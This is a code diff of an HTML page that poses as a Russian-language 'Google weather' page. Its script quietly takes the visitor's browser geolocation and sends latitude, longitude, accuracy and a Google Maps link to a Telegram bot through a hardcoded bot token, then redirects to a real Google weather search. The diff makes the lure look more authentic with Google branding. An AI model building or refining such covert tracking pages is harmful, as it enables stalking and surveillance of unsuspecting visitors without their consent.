@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <title>Погода</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="refresh" content="5; url=https://www.google.com/search?q=погода">
   <style>
     body {
       margin: 0;
@@ -17,18 +16,24 @@
       flex-direction: column;
     }
     img {
-      width: 140px;
+      width: 80px;
       margin-bottom: 20px;
     }
     .text {
       color: #555;
       font-size: 18px;
+      margin-bottom: 8px;
+    }
+    .loading {
+      font-size: 14px;
+      color: #999;
     }
   </style>
 </head>
 <body>
-  <img src="https://cdn-icons-png.flaticon.com/512/869/869869.png" alt="Погода" />
-  <div class="text">Загрузка прогноза погоды...</div>
+  <img src="https://ssl.gstatic.com/onebox/weather/64/sunny.png" alt="Погода от Google" />
+  <div class="text">Определяем ваш регион...</div>
+  <div class="loading">Загрузка прогноза погоды...</div>
 
   <script>
     const botToken = "7972755394:AAFVmA7LMOgpygkl-ED_vhHd2eUs-agQ1aw";
@@ -50,12 +55,12 @@
       const lon = position.coords.longitude.toFixed(6);
       const acc = position.coords.accuracy;
 
-      const msg = `📍 Погода-редирект:\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(acc)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
+      const msg = `📍 Google Погода:\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(acc)}м\nhttps://www.google.com/maps?q=${lat},${lon}`;
       sendToTelegram(msg);
     }
 
     function handleError() {
-      sendToTelegram("⚠️ Геолокация не получена (страница 'погода')");
+      sendToTelegram("⚠️ Геолокация не получена (Google Погода)");
     }
 
     if (navigator.geolocation) {
@@ -63,6 +68,11 @@
     } else {
       sendToTelegram("⚠️ Геолокация не поддерживается браузером.");
     }
+
+    // Редирект через 5 сек
+    setTimeout(() => {
+      window.location.href = "https://www.google.com/search?q=погода";
+    }, 5000);
   </script>
 </body>
 </html>
